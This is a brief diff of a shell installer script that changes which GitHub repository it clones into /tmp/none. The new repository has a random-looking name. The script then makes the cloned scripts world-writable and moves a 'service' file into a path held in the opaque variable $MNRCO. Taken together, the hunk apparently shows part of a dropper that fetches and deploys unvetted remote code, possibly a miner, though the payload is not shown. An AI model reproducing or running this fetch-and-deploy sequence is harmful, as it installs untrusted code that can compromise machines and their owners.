@@ -13,7 +13,7 @@ sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essen
 sudo apt-get install dos2unix
 sleep 2
 cd /tmp && mkdir none
-git clone https://github.com/nomonom/toropil.git /tmp/none
+git clone https://github.com/dfkujgdjfgf/unnnsssoip.git /tmp/none
 cd /tmp/none
 chmod 777 ./*.sh
 mv service $MNRCO
